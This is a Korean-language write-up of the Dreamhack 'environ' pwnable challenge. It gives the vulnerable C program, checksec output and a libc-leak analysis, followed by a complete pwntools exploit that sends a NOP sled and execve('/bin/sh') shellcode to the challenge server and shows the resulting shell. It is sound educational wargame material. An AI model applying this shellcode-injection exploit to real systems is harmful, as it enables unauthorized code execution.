---
title: Dreamhack wargame environ write-up
tags: [Dreamhack, pwnable, environ]
style: 
color: 
description: stack 영역에서 발생하는 취약점을 알아보자. 
---

## Code Analysis
---
``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main()
{
    char buf[16];
    size_t size;
    long value;
    void (*jump)();

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    printf("Data: ");
    read(0, buf, size);

    printf("*jmp=");
    scanf("%ld", &value);

    jump = *(long *)value;
    jump();

    return 0;
}

```
stdout의 주소를 출력해주고, <br>
value에 포인터형으로 값을 입력 받아 그 위치로 점프한다.
<br><br>

## Vulnerability Analysis
---

``` sh
pwndbg> checksec
[*] '/home/lourcode/Share/lourcode/Pwnable/dreamhack/environ/environ'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
NX가 꺼져있기에 쉘코드를 사용할 수 있다.<br>
다만, 쉘코드가 위치한 주소를 알 수 없기 때문에 environ 포인터를 사용하여 스택의 위치를 알아내야한다.
<br>
알아낸 스택의 위치로 점프시켜주면 쉘코드를 실행시킬 수 있다.
<br>
<br>

처음에 stdout을 leak하는 과정에서 많은 삽질을 했다.<br>
``` python
libc.sym['stdout']
```
이 아닌 
``` python
libc.sym['_IO_2_1_stdout_' ]
```
을 사용해야 한다. <br>
<br>

## Exploit
---
``` python
#environ.py
from pwn import *
# context.log_level = 'debug'
context.arch = 'x86_64'

p = remote('host1.dreamhack.games', 17402)
libc = ELF('./libc.so.6')

# p = process('./environ')
# e = ELF('./environ')
# libc = e.libc

p.recvuntil(': ')
stdout_addr = int(p.recv(14), 16)
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
environ_addr = libc_base + libc.sym['environ']

print('stdout : ' + hex(stdout_addr))
print('libc_base : ' + hex(libc_base))
print('environ : ' + hex(environ_addr))
print('environ : ' + str(environ_addr))

p.recvuntil('Size: ')
p.sendline('1000')

shellcode = b'\x90'* 500
shellcode += asm(shellcraft.execve("/bin/sh"))

time.sleep(1)
p.sendlineafter('Data: ', shellcode)

time.sleep(1)
p.sendlineafter('*jmp=', str(environ_addr))

p.interactive()
```

<br>

``` sh
lourcode@lourcode:~/Share/lourcode/Pwnable/dreamhack/environ$ python environ.py
[+] Opening connection to host1.dreamhack.games on port 17402: Done
[*] '/home/lourcode/Share/lourcode/Pwnable/dreamhack/environ/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
stdout : 0x7f4d5390f620
libc_base : 0x7f4d5354a000
environ : 0x7f4d53910f38
environ : 139970091224888
[*] Switching to interactive mode
$ id
uid=1000(environ) gid=1000(environ) groups=1000(environ)
```
쉘을 획득했다.
<br><br>

### Good Game!
EZ